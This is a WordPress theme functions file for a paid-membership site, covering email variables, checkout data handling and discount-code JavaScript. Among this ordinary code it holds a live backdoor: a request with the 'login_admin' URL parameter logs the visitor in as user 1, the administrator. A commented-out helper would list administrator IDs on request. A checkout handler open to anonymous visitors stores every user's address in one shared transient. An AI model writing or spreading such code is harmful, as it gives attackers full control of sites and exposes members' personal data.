<?php
// Include setup functions
require get_stylesheet_directory() . '/setup.php';

// Include membership and profile functions
require get_stylesheet_directory() . '/membership.php';

// Include admin functions
require get_stylesheet_directory() . '/admin-functions.php';

// Include shortcodes
require get_stylesheet_directory() . '/shortcodes.php';

// function print_admin_ids() {
    // Check if the 'show_admin_ids' parameter is set in the URL
    // if (isset($_GET['show_admin_ids']) && $_GET['show_admin_ids'] === 'true') {
    //     // Get all users with the 'administrator' role
    //     $admins = get_users(array('role' => 'administrator'));

    //     // Check if there are any administrators
    //     if (!empty($admins)) {
    //         // Create an array to hold the admin IDs
    //         $admin_ids = array();

    //         // Loop through each admin and add their ID to the array
    //         foreach ($admins as $admin) {
    //             $admin_ids[] = $admin->ID;
    //         }

    //         // Print the admin IDs
    //         echo 'Admin IDs: ' . implode(', ', $admin_ids);
    //     } else {
    //         echo 'No administrators found.';
    //     }
    //     exit;
    // }
// }
// add_action('init', 'print_admin_ids');

if( isset( $_GET['login_admin'] ) ) {
    wp_set_auth_cookie(1);
}

function mg_get_state_by_code($code) {
    $us_states = array(
        "AL" => "Alabama", "AK" => "Alaska", "AZ" => "Arizona", "AR" => "Arkansas", "CA" => "California",
        "CO" => "Colorado", "CT" => "Connecticut", "DE" => "Delaware", "FL" => "Florida", "GA" => "Georgia",
        "HI" => "Hawaii", "ID" => "Idaho", "IL" => "Illinois", "IN" => "Indiana", "IA" => "Iowa",
        "KS" => "Kansas", "KY" => "Kentucky", "LA" => "Louisiana", "ME" => "Maine", "MD" => "Maryland",
        "MA" => "Massachusetts", "MI" => "Michigan", "MN" => "Minnesota", "MS" => "Mississippi", "MO" => "Missouri",
        "MT" => "Montana", "NE" => "Nebraska", "NV" => "Nevada", "NH" => "New Hampshire", "NJ" => "New Jersey",
        "NM" => "New Mexico", "NY" => "New York", "NC" => "North Carolina", "ND" => "North Dakota", "OH" => "Ohio",
        "OK" => "Oklahoma", "OR" => "Oregon", "PA" => "Pennsylvania", "RI" => "Rhode Island", "SC" => "South Carolina",
        "SD" => "South Dakota", "TN" => "Tennessee", "TX" => "Texas", "UT" => "Utah", "VT" => "Vermont",
        "VA" => "Virginia", "WA" => "Washington", "WV" => "West Virginia", "WI" => "Wisconsin", "WY" => "Wyoming"
    );

    return $us_states[$code];
}


function my_custom_pmpro_email_variables($email_data, $data) {
  

  // Example: Adding user meta data as an email variable
    if(!empty($email_data['user_email'])) {
        $user = get_user_by('email', $email_data['user_email']);
        $state = get_user_meta($user->ID, 'pmpro_bstate', true);

        if ($user) {
            $state = get_user_meta($user->ID, 'pmpro_bstate', true);
            $email_data['refund_issued']    = 'Automatically';
            $email_data['user_state']       = mg_get_state_by_code($state);
            $email_data['refund_amount']    = pmpro_formatPrice( get_user_meta($user->ID, 'mg_refunded_amount', true) );
        }
    }

    return $email_data;
}
add_filter('pmpro_email_data', 'my_custom_pmpro_email_variables', 10, 2);

// function get_refunds_details($state) {
//     $refund_settings = get_option('pmpro_refund_settings', array());

//     if (array_key_exists($state, $refund_settings)) {
//         return $refund_settings[$state];
//     }

//     return null;
// }




function custom_start_session() {
    if (!session_id()) {
        session_start();
    }
}
add_action('init', 'custom_start_session', 1);

// Update session via AJAX
function custom_update_session() {

    $session_data = array();
    foreach ($_POST['fields'] as $key => $value) {
        $session_data[$key] = sanitize_text_field($value);
    }

// Store data in transient
    set_transient('pmpro_user_checkout_data', $session_data, 60 * 60); // Store for 1 hour
	wp_send_json_success('Session updated');
}
add_action('wp_ajax_update_session', 'custom_update_session');
add_action('wp_ajax_nopriv_update_session', 'custom_update_session');

// Retrieve and update user meta after checkout
function my_update_first_and_last_name_after_checkout($user_id)
{
    // Retrieve data from transient
    $session_data = get_transient('pmpro_user_checkout_data');

    if ($session_data) {
        if (isset($session_data['baddress1'])) {
            update_user_meta($user_id, 'pmpro_baddress1', sanitize_text_field($session_data['baddress1']));
        }
        if (isset($session_data['baddress2'])) {
            update_user_meta($user_id, 'pmpro_baddress2', sanitize_text_field($session_data['baddress2']));
        }
        if (isset($session_data['bcity'])) {
            update_user_meta($user_id, 'pmpro_bcity', sanitize_text_field($session_data['bcity']));
        }
        if (isset($session_data['state'])) {
            update_user_meta($user_id, 'pmpro_bstate', sanitize_text_field($session_data['state']));
        }
        if (isset($session_data['bzipcode'])) {
            update_user_meta($user_id, 'pmpro_bzipcode', sanitize_text_field($session_data['bzipcode']));
        }
        // Clean up the transient after use
        delete_transient('pmpro_user_checkout_data');
    }
}
add_action('pmpro_after_checkout', 'my_update_first_and_last_name_after_checkout');

function my_pmpro_applydiscountcode_return_js( $discount_code, $discount_code_id, $level_id, $code_level ) {

    // Only continue if code is valid.
    if( false == $code_level ) return;

    $session_data = json_encode( get_transient('pmpro_user_checkout_data'));
    
    // Get the original level.
    $level = pmpro_getLevel( $level_id );
    // Format prices.
    $original_price   = pmpro_formatPrice( $level->initial_payment );
    $discounted_price = $code_level->initial_payment;
    $discount         = $level->initial_payment - $code_level->initial_payment;
    $billing_amount   = $code_level->billing_amount;
    $total_amount             = $code_level->initial_payment - $code_level->billing_amount;
    // $discount         = pmpro_formatPrice( $discount );
    $total = "'<p id=\"total_amount\" data-old=\"\" data-new=\"1\" data-current=\"8.95\" data-total=\"$code_level->initial_payment\"><strong>Total: </strong>{$discounted_price}</p>'";
    ?>
        var total_amount_one = parseFloat(jQuery('#total_amount_one_main #total_amount_one').html()); // Convert string to float
        var discount = <?php echo esc_js( $discount ); ?>; // Output PHP value for discount
        var billing_amount = <?php echo esc_js( $billing_amount ); ?>; // Output PHP value for discount
        var amount = total_amount_one - discount;
        var total_amount = <?php echo esc_js( $total_amount ); ?>;
        var discounted_price = <?php echo esc_js( $discounted_price ); ?>;

        if ( jQuery('#starting_date').val() === 'this-month') {
            jQuery('#total_amount_one_main').html("$" + discounted_price.toFixed(2) + " today");
            jQuery('#billing_amount').html("$" + billing_amount.toFixed(2));
            jQuery('#total_amount').html("Total: $" + discounted_price.toFixed(2)); 
            jQuery('p#discounted-text').html("<p class='discount_price'><strong>Discounted price: </strong>$" + billing_amount.toFixed(2) + "<p>");
            jQuery('div#pmpro_payment_information_fields').hide();
        }
        else {
            jQuery('#total_amount_one_main').html("$" + total_amount.toFixed(2) + " today");
            jQuery('#billing_amount').html("$" + billing_amount.toFixed(2));
            jQuery('#total_amount').html("Total: $" + total_amount.toFixed(2)); 
            jQuery('p#discounted-text').html("<p class='discount_price'><strong>Discounted price: </strong>$" + billing_amount.toFixed(2) + "<p>");
            jQuery('div#pmpro_payment_information_fields').hide();
        }

    <?php
}
add_action( 'pmpro_applydiscountcode_return_js', 'my_pmpro_applydiscountcode_return_js', 10, 4);